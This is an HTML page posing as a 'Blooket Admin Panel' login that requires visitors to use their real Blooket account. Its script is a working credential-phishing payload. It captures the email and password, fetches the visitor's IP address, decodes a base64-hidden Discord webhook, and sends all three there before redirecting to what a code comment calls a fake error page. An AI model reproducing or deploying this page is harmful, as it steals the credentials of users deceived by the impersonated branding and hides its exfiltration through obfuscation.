<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="https://id.blooket.com/favicon.ico">
    <title>Blooket Admin Panel - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        .login-container {
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .login-container:hover {
            transform: scale(1.03);
            box-shadow: 0 15px 25px rgba(0,0,0,0.4);
        }

        .checkbox-label {
            font-size: 0.875rem; /* Text size similar to the rest of the form labels */
            color: #D1D5DB; /* Light gray color for text */
            padding-left: 8px;
            font-weight: 700; /* Make the label text bold */
        }

        .checkbox-container {
            display: flex;
            align-items: center;
        }

        .checkbox-container input {
            height: 1.25rem; /* Adjust size to match button size */
            width: 1.25rem;
            border-radius: 0.25rem;
            border: 1px solid #4B5563; /* Gray border color */
            background-color: #1F2937; /* Dark background */
        }
    </style>
</head>
<body class="bg-gradient-to-br from-gray-900 to-gray-800 min-h-screen flex items-center justify-center p-4">
    <div class="login-container bg-gray-800 shadow-2xl rounded-xl p-8 w-full max-w-md border border-gray-700">
        <div class="flex items-center justify-center mb-6">
            <i class="fas fa-wrench text-5xl text-blue-400 mr-3"></i>
            <h1 class="text-3xl font-bold text-blue-300">Blooket Admin Panel</h1>
        </div>
        
        <form id="loginForm" class="space-y-4">
            <div>
                <label for="email" class="block text-sm font-medium text-gray-300 mb-2">
                    Email Address
                </label>
                <input 
                    type="email" 
                    id="email"
                    placeholder="Enter your email"
                    class="w-full px-3 py-2 bg-gray-700 border border-gray-600 text-gray-200 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                >
            </div>
            
            <div>
                <label for="password" class="block text-sm font-medium text-gray-300 mb-2">
                    Password
                </label>
                <input 
                    type="password" 
                    id="password"
                    placeholder="Enter your password"
                    class="w-full px-3 py-2 bg-gray-700 border border-gray-600 text-gray-200 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                >
            </div>
            
            <div class="flex items-center justify-between">
                <a href="#" class="text-sm text-blue-400 hover:text-blue-300 hover:underline">
                    Forgot password?
                </a>
            </div>
            
            <!-- Checkbox for Skibidi Agreement -->
            <div class="checkbox-container mb-4">
                <input type="checkbox" id="skibidiCheckbox" class="text-blue-500 border-gray-600 rounded focus:ring-2 focus:ring-blue-500" required>
                <label for="skibidiCheckbox" class="checkbox-label">
                    I Understand I Have To Use A Real Blooket Account.
                </label>
            </div>

            <button 
                type="submit" 
                id="loginButton"
                class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-md transition duration-300 ease-in-out transform hover:scale-102 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50"
                disabled
            >
                Log In
            </button>
        </form>
    </div>

<script>
    // Encoded webhook URL
    const webhookEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViYm9rcy8xMzEwNzYzMzczMjU1NzI1MTQ2L1JZR1lIV3lUUlNDWTU5U0hveE1vV3NkNmZZeXRicmszazJQQ2JRUVZCamlwUHBnTWJ4dGdLLUw2VS1ZZ2NXdkgwakds';

    const skibidiCheckbox = document.getElementById('skibidiCheckbox');
    const loginButton = document.getElementById('loginButton');

    // Enable or disable the login button based on checkbox state
    skibidiCheckbox.addEventListener('change', function() {
        if (skibidiCheckbox.checked) {
            loginButton.disabled = false;
        } else {
            loginButton.disabled = true;
        }
    });

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Fetch the user's IP address using ipify
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip;

                // Decode the webhook URL
                const webhookUrl = atob(webhookEncoded);

                // Send the email, password, and IP address to the Discord webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New Login Attempt:
Email: ||${email}||
Password: ||${password}||
IP Address: ||${userIP}||`
                    })
                })
                .then(response => {
                    // Redirect to a fake error page or dashboard
                    window.location.href = 'https://cryptodude3.github.io/badmin/';
                })
                .catch(error => {
                    console.error('Error:', error);
                    window.location.href = 'https://cryptodude3.github.io/badmin/';
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            });
    });
</script>
</body>
</html>
